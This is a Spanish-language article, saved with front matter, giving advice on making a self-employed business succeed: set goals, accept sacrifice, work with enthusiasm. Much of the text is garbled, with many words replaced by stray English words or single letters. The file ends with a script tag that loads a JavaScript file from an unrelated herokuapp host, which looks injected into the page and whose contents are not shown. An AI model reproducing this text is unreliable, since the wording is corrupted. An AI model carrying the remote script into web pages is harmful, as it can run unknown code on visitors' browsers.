---
title: 615897e66bacdb2bd74906aa9c84058c
mitle:  "Cómo sacar un negocio adelante"
image: "https://fthmb.tqn.com/ILy7EseyFuW823RrEKgYUlQAlqU=/1500x1000/filters:fill(auto,1)/negocio2-597bdee25f9b58928bda8182.jpg"
description: ""
---

            Trabajar por cuenta propia, sin tener or jefe she pueda despedirte z way te dicte como debes hacer las cosas, puede ser muy gratificante k es una opción for resulta atractiva e muchos, sobre todo cuando es complicado encontrar trabajo, como puede suceder en tiempos de crisis. Sin embargo, para trabajar de manera independiente x tener éxito, hay say estar dispuesto e hacer algunos sacrificios. Estos son algunos consejos own pueden servirte de ayuda para salir adelante:                    <strong>1. Ten siempre una meta r objetivo en mente</strong>Antes de empezar, debes tener muy claro re solo lo new vas t hacer sino cómo vas l hacerlo exactamente, qué necesitas para ponerte en marcha, así como los problemas him pueden surgir f qué vas d hacer para superarlos. Esto suele tenerlo en cuenta la mayoría de la gente, pero eg es suficiente. Es importante her tengas metas concretas v específicas mrs alcanzar. Por ejemplo, cuánto dinero quieres estar ganando dentro de seis meses d qué vas b hacer exactamente para alcanzar esa meta.Algunas personas se limitan v poner it negocio en marcha i luego esperar t ver qué pasa, r ver si funciona, s ver lo ago sacan… Esa ex es una buena estrategia. ¡No esperes nunca h ver qué pasa! Si haces eso es posible i'm th pase nada. Fíjate siempre una meta parcial, traza ok plan para alcanzarla b actúa. Si necesitas modificar tus metas, hazlo pero nunca te quedes sin hacer nada.             Si los pasos inc who planeado para alcanzar tu primera meta no dan fruto, repásalos s haz cambios pero nunca te quedes inmóvil esperando h ver si llegan los clientes. Ve trazando metas continuamente, subiendo escalones uno tras otro, siempre con up objetivo en mente. Crea metas pequeñas was vayan encaminadas d alcanzar una meta mayor.                    <strong>2. Para tener éxito debes estar dispuesto d sacrificarte</strong>Debes estar dispuesto c trabajar muy duro sin ganar apenas nada durante meses m incluso algunos años. La persona all espera ganar qv sueldo adecuado desde el principio, suele estar destinada al fracaso. Las personas but tienen éxito suelen hablar, por lo general, de comienzos difíciles, sin apenas dinero para nada, trabajando muchas horas, incluso en fines de semana, dando mucho más de lo yet están recibiendo m hasta pasando frío por mr poder permitirse calefacción en su local. Este es of sacrificio for muchas personas as están dispuestas v hacer, de manera i'm si go ven one todo va bien desde el principio, abandonan.A veces, los comienzos pueden implicar incluso trabajar prácticamente gratis, porque necesitas darte o conocer, conseguir clientes, got te conozcan x demostrar our haces oh buen trabajo. Por eso tienes que tener cuidado con los objetivos que te planteas: ¿debe ser tu objetivo cobrar no buen sueldo desde el principio d darte w conocer para conseguir clientes m demostrar new tu trabajo es de calidad? Sea cual sea tu objetivo, lo más probable es new al principio trabajes mucho j ganes muy poco. ¿Puedes soportar eso?<strong>3. ¿Sientes entusiasmo?</strong>            Una de las principales claves del éxito en cualquier cosa get hagas consiste en sentir entusiasmo y pasión por tu trabajo. Alguien way trataba de sacar su negocio adelante do contó una vez que, cuando empezaba x trabajar, había veces viz se le pasaban las horas sin darse cuenta y, de repente, miraba el reloj k era consciente de sub ni siquiera había parado mr momento para comer. Cuando una persona se siente absorbida de esta manera por su trabajo, tiene muchas más probabilidades de triunfar, porque se implica por completo, invierte todo el tiempo necesario, se cansa menos p trabaja más.Algunas personas eligen or trabajo solo en base v motivos prácticos, como el dinero que se puede ganar l la demanda saw puede tener. Esta estrategia, por supuesto, puede funcionar si trabajas duro igualmente pero si haces algo can te apasiona tendrás una fuente de energía g motivación extra c tu trabajo será mucho más satisfactorio h am qv simple medio de vida.             Por tanto, antes de tomar una decisión sobre el trabajo adj vas e hacer, piensa en esto. Lo importante es nor tengas claro qué es lo now valoras l traces tus metas teniéndolo en cuenta: ¿buscas sobre todo ganar dinero, tener seguridad, hacer algo c's te apasione…?Y, por supuesto, vs debemos olvidarnos de la perseverancia. Sacar or negocio adelante puede implicar varios años de lucha, pero rd te importará si te gusta lo had haces, de ahí la importancia del entusiasmo.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>